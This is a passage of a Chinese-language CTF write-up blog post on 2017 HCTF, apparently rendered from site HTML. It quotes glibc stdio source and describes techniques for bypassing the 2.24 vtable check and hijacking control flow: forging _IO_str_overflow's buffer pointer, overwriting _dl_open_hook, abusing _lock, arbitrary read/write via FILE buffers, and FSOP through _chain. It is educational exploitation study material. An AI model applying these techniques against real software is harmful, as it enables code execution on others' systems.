(&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp) = &amp;_IO_file_jumps;</div><div class=\"line\">  _IO_new<span class=\"type\">_file_init_internal</span> (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span>  !_IO_UNIFIED_JUMPTABLES</span></div><div class=\"line\">  <span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.vtable = NULL;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">  <span class=\"keyword\">if</span> (_IO_file_fopen ((_IO_FILE *) <span class=\"keyword\">new</span><span class=\"type\">_f</span>, filename, mode, is32) != NULL)</div><div class=\"line\">    <span class=\"keyword\">return</span> __fopen_maybe_mmap (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file);</div><div class=\"line\"> </div><div class=\"line\">  _IO_un_link (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp);</div><div class=\"line\">  free (<span class=\"keyword\">new</span><span class=\"type\">_f</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> NULL;</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\">_IO_FILE *</div><div class=\"line\">_IO_new<span class=\"type\">_fopen</span> (const char *filename, const char *mode)</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> __fopen_internal (filename, mode, <span class=\"number\">1</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\">strong_alias (_IO_new<span class=\"type\">_fopen</span>, __new<span class=\"type\">_fopen</span>)</div><div class=\"line\">versioned_symbol (libc, _IO_new<span class=\"type\">_fopen</span>, _IO_fopen, GLIBC_2_1);</div><div class=\"line\">versioned_symbol (libc, __new<span class=\"type\">_fopen</span>, fopen, GLIBC_2_1);</div></pre></td></tr></table></figure>\n<ul>\n<li><p><code>fopen</code></p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/2.png\" alt=\"\"></li>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/3.png\" alt=\"\"></li>\n<li>链入链表头</li>\n</ul>\n</li>\n<li><p>fread</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/4.png\" alt=\"\"></li>\n</ul>\n</li>\n<li><p>fwrite</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/5.png\" alt=\"\"></li>\n</ul>\n</li>\n<li><p>fclose</p>\n<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/6.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<p>主要逻辑和fopen差不多，不再细表。</p>\n<p>看一下<code>FILE</code>在2.24之后出现的check</p>\n<p>主要是对vtable的合法性进行检查</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* Perform vtable pointer validation.  If validation fails, terminate</span></div><div class=\"line\">   the process.  */</div><div class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> _<span class=\"function\">IO_jump_t *</span></div><div class=\"line\"><span class=\"title\">IO_validate_vtable</span> <span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *vtable)</span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"comment\">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></div><div class=\"line\">     section.  */</div><div class=\"line\">  <span class=\"keyword\">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *ptr = (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *) vtable;</div><div class=\"line\">  <span class=\"keyword\">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</div><div class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (offset &gt;= section_length))</div><div class=\"line\">    <span class=\"comment\">/* The vtable pointer is not in the expected section.  Use the</span></div><div class=\"line\">       slow path, which will terminate the process if necessary.  */</div><div class=\"line\">    _IO_vtable_check ();</div><div class=\"line\">  <span class=\"keyword\">return</span> vtable;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>看注释可以得出，如果vtable的指针没有落在<code>__libc_IO_vatbles</code>的节中，那么就会进行<code>_IO_vtable_check</code>的检查</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">void</span> attribute_hidden</div><div class=\"line\">_IO_vtable_check (<span class=\"keyword\">void</span>)</div><div class=\"line\">&#123;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> SHARED</span></div><div class=\"line\">  <span class=\"comment\">/* Honor the compatibility flag.  */</span></div><div class=\"line\">  <span class=\"keyword\">void</span> (*flag) (<span class=\"keyword\">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> PTR_DEMANGLE</span></div><div class=\"line\">  PTR_DEMANGLE (flag);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"keyword\">if</span> (flag == &amp;_IO_vtable_check)</div><div class=\"line\">    <span class=\"keyword\">return</span>;</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/* In case this libc copy is in a non-default namespace, we always</span></div><div class=\"line\">     need to accept foreign vtables because there is always a</div><div class=\"line\">     possibility that FILE * objects are passed across the linking</div><div class=\"line\">     boundary.  */</div><div class=\"line\">  &#123;</div><div class=\"line\">    Dl_info di;</div><div class=\"line\">    <span class=\"keyword\">struct</span> link_map *l;</div><div class=\"line\">    <span class=\"keyword\">if</span> (_dl_open_hook != <span class=\"literal\">NULL</span></div><div class=\"line\">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span></div><div class=\"line\">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</div><div class=\"line\">      <span class=\"keyword\">return</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span> <span class=\"comment\">/* !SHARED */</span></span></div><div class=\"line\">  <span class=\"comment\">/* We cannot perform vtable validation in the static dlopen case</span></div><div class=\"line\">     because FILE * handles might be passed back and forth across the</div><div class=\"line\">     boundary.  Therefore, we disable checking in this case.  */</div><div class=\"line\">  <span class=\"keyword\">if</span> (__dlopen != <span class=\"literal\">NULL</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"> </div><div class=\"line\">  __libc_fatal (<span class=\"string\">\"Fatal error: glibc detected an invalid stdio handle\\n\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>主要检查了三种情况，如果这三种情况都不满足的话，那么就说明vtable已经被改变过了。</p>\n<p>我们看到两个地方可以通过检查</p>\n<p><img src=\"/2017/11/13/2017HCTF赛后整理/7.png\" alt=\"\"></p>\n<p>第一个地方因为有指针检查所以很难bypass<br>第二处需要我们overwrite<code>_dl_open_hook</code>，这个指针是一个有三个函数的结构体</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* This code is to support __libc_dlopen from __libc_dlopen'ed shared</span></div><div class=\"line\">   libraries.  We need to ensure the statically linked __libc_dlopen</div><div class=\"line\">   etc. functions are used instead of the dynamically loaded.  */</div><div class=\"line\"><span class=\"keyword\">struct</span> dl_open_hook</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">void</span> *(*dlopen_mode) (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *name, <span class=\"keyword\">int</span> mode);</div><div class=\"line\">  <span class=\"keyword\">void</span> *(*dlsym) (<span class=\"keyword\">void</span> *<span class=\"built_in\">map</span>, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *name);</div><div class=\"line\">  <span class=\"keyword\">int</span> (*dlclose) (<span class=\"keyword\">void</span> *<span class=\"built_in\">map</span>);</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<h4 id=\"exp-0x00\"><a href=\"#exp-0x00\" class=\"headerlink\" title=\"exp 0x00\"></a>exp 0x00</h4><p>档不能伪造vtable的时候，发现可以直接使用原先_vtable_jmp的函数``JUMP_INIT(overflow, _IO_str_overflow)</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">const struct _IO_jump_t _IO_str_jumps libio_vtable =</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT_DUMMY,</span></div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(finish, </span>_IO_str_finish),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(overflow, </span>_IO_str_overflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(underflow, </span>_IO_str_underflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(uflow, </span>_IO_default_uflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(pbackfail, </span>_IO_str_pbackfail),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsputn, </span>_IO_default_xsputn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsgetn, </span>_IO_default_xsgetn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekoff, </span>_IO_str_seekoff),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekpos, </span>_IO_default_seekpos),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(setbuf, </span>_IO_default_setbuf),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(sync, </span>_IO_default_sync),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(doallocate, </span>_IO_default_doallocate),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(read, </span>_IO_default_read),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(write, </span>_IO_default_write),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seek, </span>_IO_default_seek),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(close, </span>_IO_default_close),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(stat, </span>_IO_default_stat),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(showmanyc, </span>_IO_default_showmanyc),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(imbue, </span>_IO_default_imbue)</div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<p>这个<code>_IO_str_overflow</code>的源码中有<code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>这样一句，由于我们是可以控制<code>fp</code>的，所以我们伪造<code>fp-&gt;_s._allocate_buffer</code>这个偏移的函数即可控制一次rip。</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\">_IO_str_overflow (_IO_FILE *fp, int c)</div><div class=\"line\">&#123;</div><div class=\"line\">  int flush_only = c == EOF;</div><div class=\"line\">  _IO_size_t pos;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_flags &amp; _IO_NO_WRITES)</div><div class=\"line\">      return flush_only ? <span class=\"number\">0</span> : EOF;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> ((fp-&gt;</span>_<span class=\"function\"><span class=\"title\">flags</span> &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;</span>_flags &amp; _IO_CURRENTLY_PUTTING))</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> = fp-&gt;</span>_IO_read_ptr;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_ptr</span> = fp-&gt;</span>_IO_read_end;</div><div class=\"line\">    &#125;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">pos</span> = fp-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> - fp-&gt;</span>_IO_write_base;</div><div class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span></div><div class=\"line\">        return EOF;</div><div class=\"line\">      <span class=\"keyword\">else</span></div><div class=\"line\">        &#123;</div><div class=\"line\">          char *new_buf;</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">char</span> *old_buf = fp-&gt;</span>_IO_buf_base;</div><div class=\"line\">          size_t old_blen = _IO_blen (fp);</div><div class=\"line\">          _IO_size_t new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</div><div class=\"line\">          <span class=\"keyword\">if</span> (new_size &lt; old_blen)</div><div class=\"line\">            return EOF;</div><div class=\"line\">          new_buf</div><div class=\"line\">            = (<span class=\"function\"><span class=\"title\">char</span> *) (*((_IO_strfile *) fp)-&gt;</span>_s._allocate_buffer) (new_size);</div><div class=\"line\">          <span class=\"keyword\">if</span> (new_buf == NULL)</div><div class=\"line\">            &#123;</div><div class=\"line\">              <span class=\"comment\">/*          __ferror(fp) = 1; */</span></div><div class=\"line\">              return EOF;</div><div class=\"line\">            &#125;</div><div class=\"line\">          <span class=\"keyword\">if</span> (old_buf)</div><div class=\"line\">            &#123;</div><div class=\"line\">              memcpy (new_buf, old_buf, old_blen);</div><div class=\"line\">              (*((_IO_<span class=\"function\"><span class=\"title\">strfile</span> *) fp)-&gt;</span>_s._free_buffer) (old_buf);</div><div class=\"line\">              <span class=\"comment\">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></div><div class=\"line\">              <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_buf_base = NULL;</div><div class=\"line\">            &#125;</div><div class=\"line\">          memset (new_buf + old_blen, <span class=\"string\">'\\0'</span>, new_size - old_blen);</div><div class=\"line\"> </div><div class=\"line\">          _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_base</span> = new_buf + (fp-&gt;</span>_IO_read_base - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_ptr</span> = new_buf + (fp-&gt;</span>_IO_read_ptr - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_end</span> = new_buf + (fp-&gt;</span>_IO_read_end - old_buf);</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> = new_buf + (fp-&gt;</span>_IO_write_ptr - old_buf);</div><div class=\"line\"> </div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_write_base = new_buf;</div><div class=\"line\">          <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_end</span> = fp-&gt;</span>_IO_buf_end;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</div><div class=\"line\">    *<span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_write_ptr++ = (unsigned char) c;</div><div class=\"line\">  <span class=\"function\"><span class=\"title\">if</span> (fp-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">write_ptr</span> &gt; fp-&gt;</span>_IO_read_end)</div><div class=\"line\">    <span class=\"function\"><span class=\"title\">fp</span>-&gt;</span>_IO_<span class=\"function\"><span class=\"title\">read_end</span> = fp-&gt;</span>_IO_write_ptr;</div><div class=\"line\">  return c;</div><div class=\"line\">&#125;</div><div class=\"line\">libc_hidden_def (_IO_str_overflow)</div></pre></td></tr></table></figure>\n<h4 id=\"exp-0x01\"><a href=\"#exp-0x01\" class=\"headerlink\" title=\"exp 0x01\"></a>exp 0x01</h4><p>再看下<code>dl_open_hook</code>这个指针，似乎是在有其他hook_so的时候使用的，在检查<code>_dl_open_hook</code>是否为空之后，会进行<code>_vtable_check</code>然后调用<code>dlopen_mode</code>这个函数指针处，这个结构体我们可以伪造，接着就得到一次控制rip的机会。</p>\n<h4 id=\"exp-0x02\"><a href=\"#exp-0x02\" class=\"headerlink\" title=\"exp 0x02\"></a>exp 0x02</h4><p>@angelboy下面提供了一种思路，通过<code>_fileno</code>和<code>_IO_buffer</code>来进行任意地址读写，原理也容易理解，当我们可以控制<code>_IO_buffer</code>的指针时，就可以适当的设置缓冲区地址到我们的目标地址即可。</p>\n<ul>\n<li>Arbitrary memory reading<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/9.png\" alt=\"\"></li>\n</ul>\n</li>\n<li>Arbitrary memory writing<ul>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/8.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"exp-0x03\"><a href=\"#exp-0x03\" class=\"headerlink\" title=\"exp 0x03\"></a>exp 0x03</h4><p>以及whctf那种利用unsortbins attack（main_arena）的（因为libc中stdin下面就是main_arena，可以一直覆盖到，只需要将<code>_IO_buf_end</code>改写到后面即可）</p>\n<h4 id=\"exp-0x04\"><a href=\"#exp-0x04\" class=\"headerlink\" title=\"exp 0x04\"></a>exp 0x04</h4><p>利用<code>_IO_lock_t *_lock</code>这个结构来控制rip。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">typedef struct &#123; int lock; int cnt; void *owner; &#125; _IO_lock_t;</div><div class=\"line\">.....</div><div class=\"line\">.....</div><div class=\"line\">struct _IO_FILE &#123;</div><div class=\"line\">......</div><div class=\"line\">  _IO_lock_t *_lock;</div><div class=\"line\">.....</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>这个是2.24的版本，直接控制这个结构体的指针即可。<br>其调用的源码是</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\"><span class=\"variable\">_IO_new_fclose</span> (<span class=\"variable\">_IO_FILE</span> *fp)</div><div class=\"line\">&#123;</div><div class=\"line\">...</div><div class=\"line\">  <span class=\"variable\">_IO_acquire_lock</span> (fp);</div><div class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;<span class=\"variable\">_IO_file_flags</span> &amp; <span class=\"variable\">_IO_IS_FILEBUF</span>)</div><div class=\"line\">    status = <span class=\"variable\">_IO_file_close_it</span> (fp);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>我们把这个<code>_lock</code>结构体指向一个可以控制的地方，rip就会跳到<code>call *(_lock+0x10)</code>，可以控制rip。</p>\n<h4 id=\"exp-0x05-FSOP\"><a href=\"#exp-0x05-FSOP\" class=\"headerlink\" title=\"exp 0x05 FSOP\"></a>exp 0x05 FSOP</h4><p>FSOP</p>\n<p>这个主要就是利用<code>chain</code>这个字段，档我们调用</p>\n<ul>\n<li>Glibc abort routine</li>\n<li>exit</li>\n<li>main return</li>\n</ul>\n<p>时，<code>_IO_flush_all_lockp</code>就会被调用，然后fflush all stream</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">int</div><div class=\"line\"><span class=\"variable\">_IO_flush_all_lockp</span> (int do_lock)</div><div class=\"line\">&#123;</div><div class=\"line\">  int result = <span class=\"number\">0</span>;</div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *fp;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_MTSAFE_IO</span></div><div class=\"line\">  <span class=\"variable\">_IO_cleanup_region_start_noarg</span> (flush_cleanup);</div><div class=\"line\">  <span class=\"variable\">_IO_lock_lock</span> (list_all_lock);</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">for</span> (fp = (<span class=\"variable\">_IO_FILE</span> *) <span class=\"variable\">_IO_list_all</span>; fp != NULL; fp = fp-&gt;<span class=\"variable\">_chain</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">      run_fp = fp;</div><div class=\"line\">      <span class=\"keyword\">if</span> (do_lock)</div><div class=\"line\">        <span class=\"variable\">_IO_flockfile</span> (fp);</div><div class=\"line\"> </div><div class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;<span class=\"variable\">_mode</span> &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;<span class=\"variable\">_IO_write_ptr</span> &gt; fp-&gt;<span class=\"variable\">_IO_write_base</span>)</div><div class=\"line\">           || (<span class=\"variable\">_IO_vtable_offset</span> (fp) == <span class=\"number\">0</span></div><div class=\"line\">               &amp;&amp; fp-&gt;<span class=\"variable\">_mode</span> &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;<span class=\"variable\">_wide_data</span>-&gt;<span class=\"variable\">_IO_write_ptr</span></div><div class=\"line\">                                    &gt; fp-&gt;<span class=\"variable\">_wide_data</span>-&gt;<span class=\"variable\">_IO_write_base</span>))</div><div class=\"line\">           )</div><div class=\"line\">          &amp;&amp; <span class=\"variable\">_IO_OVERFLOW</span> (fp, EOF) == EOF)     <span class=\"comment\">// Trigger virtual funcation</span></div><div class=\"line\">...</div><div class=\"line\"> </div><div class=\"line\">  return result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>当我们修改<code>chain</code>的时候，将其控制到我们可写的一个地方，然后可以选择0x00的方法直接getshell，也可以选择两个或多个<code>FILE</code>结构体来完成rop（但是感觉好鸡肋，要没有_vtable_check，而且在可以控制一次rip的情况下可以跳到很多地方去）</p>\n<h2 id=\"level-3\"><a href=\"#level-3\" class=\"headerlink\" title=\"level 3\"></a>level 3</h2><h2 id=\"level-4\"><a href=\"#level-4\" class=\"headerlink\" title=\"level 4\"></a>level 4</h2><h2 id=\"level-5\"><a href=\"#level-5\" class=\"headerlink\" title=\"level 5\"></a>level 5</h2>","excerpt":"<h2 id=\"level-1\"><a href=\"#level-1\" class=\"headerlink\" title=\"level 1\"></a>level 1</h2><h3 id=\"Evr-Q\"><a href=\"#Evr-Q\" class=\"headerlink\" title=\"Evr_Q\"></a>Evr_Q</h3><p>一个基本的逆向，但是有点麻烦。。<br>参考资料:<br><a href=\"https://bbs.pediy.com/thread-70470.htm\">反调试技巧总结-原理和实现(1)(2)(3)(4)(5)(6)……</a><br><a href=\"http://www.cppblog.com/xunbu7/archive/2013/01/05/196963.html\">反调试技巧总结-原理和实现</a><br><a href=\"https://bbs.pediy.com/thread-159935.htm\">简单解释Windows如何使用FS段寄存器</a><br><a href=\"https://www.cnblogs.com/dliv3/p/6411814.html\">PE中的aslr</a><br><a href=\"https://www.cnblogs.com/dliv3/p/6489629.html\">TLS回调函数</a><br><a href=\"http://blog.csdn.net/fengyunzhongwei/article/details/29382945\">一种基于TLS的高级反调试技术</a></p>\n<h2 id=\"level-2\"><a href=\"#level-2\" class=\"headerlink\" title=\"level 2\"></a>level 2</h2><h3 id=\"guestbook\"><a href=\"#guestbook\" class=\"headerlink\" title=\"guestbook\"></a>guestbook</h3><p>格式化字符串可解决，但是我在<code>(*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] &amp; 0x400 )</code>上卡了很久，后来搜索才知道是<code>__isctype</code>的宏展开。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"># include 